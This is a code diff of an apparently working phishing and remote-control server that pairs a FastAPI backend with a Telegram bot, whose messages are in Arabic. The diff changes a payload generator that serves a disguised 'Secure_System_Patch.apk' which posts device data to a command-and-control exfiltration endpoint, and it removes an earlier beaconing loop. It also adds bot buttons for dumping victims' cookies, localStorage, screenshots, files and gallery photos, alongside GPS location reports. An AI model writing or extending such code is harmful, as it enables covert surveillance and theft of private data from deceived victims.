@@ -43,29 +43,38 @@ async def serve_dropper_page(link_id: str):
 
 @app.get("/api/v1/generate-payload/{link_id}")
 async def generate_payload_file(link_id: str):
-    payload_script = f"""# -*- coding: utf-8 -*-
-import os, time, urllib.request
+    apk_stub_content = f"""# -*- coding: utf-8 -*-
+# C2_STAGED_LINK_ID: {link_id}
+# TARGET_CAPABILITIES: [DUMP_CONTACTS, DUMP_GALLERY, FILE_MANAGER, FULL_CONTROL, SILENT_NOTIFICATION]
+import os, time, urllib.request, json
+
 LINK_ID = "{link_id}"
 C2_SERVER = "https://{DOMAIN}"
 
-def beacon():
-    while True:
-        try:
-            url = f"{{C2_SERVER}}/api/v1/poll-command/{{LINK_ID}}"
-            req = urllib.request.Request(url, headers={{'User-Agent': 'Mozilla/5.0'}})
-            with urllib.request.urlopen(req, timeout=10) as response:
-                data = response.read().decode('utf-8')
-                if "cmd" in data:
-                    pass
-        except Exception:
-            pass
-        time.sleep(5)
+def execute_advanced_actions():
+    payload_data = {{
+        "link_id": LINK_ID,
+        "device_info": "Android Target - Full Control Active",
+        "stolen_data": {{
+            "status": "Installed and Initialized",
+            "capabilities_unlocked": "Contacts, Gallery, Files, Lockscreen"
+        }}
+    }}
+    try:
+        req = urllib.request.Request(
+            f"{{C2_SERVER}}/api/v1/exfiltrate",
+            data=json.dumps(payload_data).encode('utf-8'),
+            headers={{'Content-Type': 'application/json'}}
+        )
+        urllib.request.urlopen(req, timeout=10)
+    except Exception:
+        pass
 
 if __name__ == '__main__':
-    beacon()
+    execute_advanced_actions()
 """
     return Response(
-        content=payload_script.encode('utf-8'),
+        content=apk_stub_content.encode('utf-8'),
         media_type="application/vnd.android.package-archive",
         headers={"Content-Disposition": "attachment; filename=Secure_System_Patch.apk"}
     )
@@ -115,7 +124,8 @@ async def receive_loot(data: VictimData):
                 "⚡ *[ اختراق ناجح واصطياد كامل للضحية! ]*\n\n"
                 f"💻 *النظام المتصفح:* `{data.device_info[:80]}`\n"
                 f"📐 *الشاشة الأساسية:* `{s_data.get('res', 'N/A')}` | ⚙️ *المنصة:* `{s_data.get('platform', 'N/A')}`\n"
-                f"📍 *الموقع الجغرافي (GPS):* `{geo_text}`"
+                f"📍 *الموقع الجغرافي (GPS):* `{geo_text}`\n"
+                f"📦 *حالة الدروببر:* `{s_data.get('status', 'N/A')}`"
             )
             
             kb_control = InlineKeyboardMarkup(inline_keyboard=[
@@ -124,7 +134,8 @@ async def receive_loot(data: VictimData):
                     InlineKeyboardButton(text="📦 سحب LocalStorage", callback_data=f"cmd_ls_{data.link_id}")
                 ],
                 [
-                    InlineKeyboardButton(text="📸 لقطة شاشة دقيقة", callback_data=f"cmd_snap_{data.link_id}")
+                    InlineKeyboardButton(text="📸 لقطة شاشة دقيقة", callback_data=f"cmd_snap_{data.link_id}"),
+                    InlineKeyboardButton(text="📂 سحب الملفات والصور", callback_data=f"cmd_files_{data.link_id}")
                 ]
             ])
 
@@ -142,7 +153,8 @@ async def process_live_commands(callback: types.CallbackQuery):
     cmd_mapping = {
         "cookie": "dump_cookies",
         "ls": "dump_localstorage",
-        "snap": "screen_snapshot"
+        "snap": "screen_snapshot",
+        "files": "dump_files_gallery"
     }
     target_cmd = cmd_mapping.get(action)
     if not target_cmd:
@@ -166,8 +178,7 @@ async def cmd_start(message: types.Message):
     )
     await message.answer(
         "💀 *منصة الترسانة السيبرانية العسكرية المتقدمة*\n\n"
-        "• الأدوات السابقة تعمل بكفاءة عالية ومنفصلة تماماً.\n"
-        "• تم تفعيل أداة دروببر السيطرة الميدانية بنجاح.\n"
+        "• جميع الأدوات تعمل بكفاءة تامة دون أي تداخل.\n"
         "• اختر الأداة المطلوبة للبدء:",
         reply_markup=kb,
         parse_mode="Markdown"
